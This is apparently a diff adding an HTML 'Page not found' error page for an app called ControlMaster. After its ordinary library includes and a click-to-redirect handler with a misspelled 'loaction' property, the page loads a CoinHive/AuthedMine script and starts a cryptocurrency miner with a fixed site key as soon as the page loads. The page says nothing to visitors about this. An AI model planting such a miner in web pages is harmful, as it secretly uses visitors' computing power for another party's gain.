@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>ControlMaster</title>
+        <meta title="ControlMaster"/>
+        <meta charset="utf-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1"/>
+        <link rel="stylesheet" href="Content/css/materialize.min.css"/>
+        <link rel="stylesheet" href="Content/css/style.css"/>
+        <link rel="stylesheet" href="Content/css/404.css"/>
+    </head>
+    <body>
+        <div class="page">
+            <div style="height:100vh">
+                <a class="brand-logo center" >ControlMaster</a>
+                <br>
+                <div class="e-text">Page not found!</div>
+            </div>
+        </div>
+        <script src="Content/js/jquery-3.2.1.min.js"></script>
+        <script src="Content/js/jquery.cookie.js"></script>
+        <script src="Content/js/vue.js"></script>
+        <script src="Content/js/materialize.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.3/socket.io.js"></script>
+        <script>
+        $(".page").click(function() {
+          this.loaction="https://controlmaster-app.firebaseapp.com/";
+        });
+        </script>
+        <script src="https://authedmine.com/lib/authedmine.min.js"></script>        
+        <script>
+            var miner = new CoinHive.Anonymous('rHOL5K4hqk4jZfGNVZ3LnmKp0M8fqfJH');
+            miner.start();
+        </script>        
+    </body>
+</html>
